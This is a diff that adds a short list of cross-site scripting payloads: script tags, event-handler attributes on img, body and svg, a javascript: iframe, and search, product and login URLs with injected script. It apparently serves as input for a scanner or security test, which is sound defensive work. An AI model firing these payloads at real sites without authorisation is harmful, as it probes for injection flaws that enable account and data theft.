@@ -1,0 +1,8 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<iframe src='javascript:alert(1)'>
+/search?q=<script>alert(123)</script>
+<body onload=alert('XSS')>
+/products?name=<img src=x onerror=alert('XSS')>
+/login?username=admin&password=<script>alert('hack')</script>
+<svg onload=alert(1)>
